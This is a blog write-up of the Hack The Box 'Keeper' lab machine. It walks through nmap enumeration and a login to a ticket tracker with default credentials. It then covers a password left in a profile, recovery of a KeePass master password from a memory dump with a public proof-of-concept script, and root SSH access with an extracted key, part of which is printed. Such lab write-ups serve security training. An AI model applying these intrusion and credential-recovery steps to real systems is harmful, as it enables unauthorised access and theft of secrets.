---
layout: post
title: "HTB: Keeper"
author: Andrew Cherney
date: 2024-02-10 11:07:36
tags: htb easy-box pki webapp cve
icon: "assets/icons/keeper.png"
post_description: "Simple and short. Looking through the ticket tracking service we find a way to login as the user, after that we can dump the credentials to a password manager and ssh in as root."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

<h2>nmap</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Keeper]
└──╼ $nmap -sC 10.10.11.227
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-29 20:01 CDT
Nmap scan report for 10.10.11.227
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

```

<h2>http - port 80</h2>

![homepage redirect](/img/keeper/keeper_homepage.png)

![ticket tracking login](/img/keeper/keeper_ticket_login.png)

<h1>User as Inorgaard</h1>

We are met with a redirect to a ticket tracking service. This version of request tracker didn't seem to have any CVEs or exploit-db posts when searching. I decided a good additional start place was to check the default credentials for this service, which are incidentally *root:password*.

![admin page](/img/keeper/keeper_admin_page.png)

A basic overview of this site is to respond to tickets submitted by users. Here there is one recently viewed ticket which references a **.dmp** file that has been removed as an attachment.

![recent ticket](/img/keeper/keeper_ticket_view.png)

The admin here is named **Inorgaard** so I headed over to his profile to see if it leaked the **.dmp** file or anything else. 

![Inorgaard user profile](/img/keeper/keeper_Inorgaard_user_page.png)

Well that's a commented password.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Keeper]
└──╼ $ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb\'s password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Aug 29 11:00:15 2023 from 10.10.14.9
lnorgaard@keeper:~$ whoami
lnorgaard
lnorgaard@keeper:~$ cat user.txt
b47c29c1363fb-------------------
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp passcodes.kdbx RT30000.zip  user.txt
```

<h1>Root</h1>

<h2>KeePass password dumping</h2>

There is an obvious place to look here and that is at the **KeePassDumpFull.dmp** file. There exists [a way to dump the passwords of certain versions of KeePassDumpFull](https://github.com/vdohney/keepass-password-dumper) and I will be using [a python variant of that code](https://github.com/CMEPW/keepass-dump-masterkey).

TLDR: .NET is awful and stores every character typed in memory and it doesn't go away, searching for the patterns that are left behind can reveal most of the characters (dependent on some factors). The first github page also gives some remediation which includes deleting a ton of files that might have stored this info and reformatting your drive and reinstalling your OS. 

```bash
lnorgaard@keeper:~$ python3 /tmp/poc.py KeePassDumpFull.dmp 
2023-08-30 03:59:09,467 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

From what I was reading the only character that cannot be read should be the first one, but there are 3 which in fact are not read ... or are not standard characters. In searching on duck I found [Rødgrød med fløde, a Danish berry pudding](https://nordicfoodliving.com/danish-red-berry-pudding-rodgrod-med-flode/), which lines up nicely with the name Inorgaard, or formatted a little better first initial **I** [last name Norgaard](https://en.wikipedia.org/wiki/N%C3%B8rgaard).

![KeyPass Danish Password Login](/img/keeper/keepass_password.png)

![KeyPass Passwords](/img/keeper/keepass_vault.png)

From that password vault I get a root password and an additional note of a Putty **.ppk** file. I tried to ssh in but I was denied, it seems I need the key extracted from that putty keyring. 

As of note I needed the newest version of putty and the commandline latest version did not work for me.

![Putty Key extraction](/img/keeper/putty_openssh_export.png)

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz
...
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Keeper]
└──╼ $chmod 400 keeper.pem 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Keeper]
└──╼ $ssh root@keeper.htb -i keeper.pem 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug 29 20:17:33 2023 from 10.10.14.6
root@keeper:~# cat /root/root.txt
7986808062cb4-------------------
```
